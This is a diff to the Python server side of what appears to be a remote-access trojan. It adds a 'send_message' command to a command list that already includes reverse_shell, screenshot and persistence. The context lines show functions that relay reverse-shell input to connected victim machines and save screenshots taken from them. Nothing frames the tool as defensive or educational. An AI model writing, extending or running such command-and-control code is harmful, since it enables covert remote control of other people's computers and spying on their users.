@@ -1,10 +1,11 @@
 from socket import *
+from gui import *
 import os
 import time
 
 BUFFER_SIZE = 4096
 SEPARATOR = "<SEPARATOR>"
-COMMANDS = ["ipconfig", "whoami", "reverse_shell", "screenshot", "persistence", "exit"]
+COMMANDS = ["ipconfig", "whoami", "reverse_shell", "screenshot", "persistence", "send_message", "exit"]
 USERNAME = os.getlogin() #Gets the PC User.
 
 #List Clients
@@ -73,12 +74,16 @@ def run_commands(clients):
                 while True:
                     command = choose_command()  # Select Command
                     if (command == "exit"):
+                        menu()
                         break
                     if command == "reverse_shell":
                         reverse_shell(client, command) #Start revese shell
                         continue
                     if command == "screenshot":
                         screenshot(client, command) #Take screenshot
+                        continue
+                    if command == "send_message":
+                        send_message(client, command) #Send message
                         continue
                     else:
                         #if not any of the above just the input from the server and wait for respond
@@ -134,7 +139,6 @@ def screenshot(client, command):
     print(f"Screenshot saved in: {filename}")
     time.sleep(1)
 
-
 #Get Reverse_$hell
 def reverse_shell(client, command):
     """Function manage all communication of the reverse shell with the client"""
@@ -146,3 +150,11 @@ def reverse_shell(client, command):
             break
         else:
             client.sendall(string.encode())
+
+def send_message(client,command):
+    """this function sents a message to the client"""
+    client.sendall(command.encode()) #Send him the command
+    msg = input("What's the message: ")
+    client.sendall(msg.encode()) #Send him the message
+    print(client.recv(BUFFER_SIZE).decode()) #Get Response from client
+    time.sleep(1)
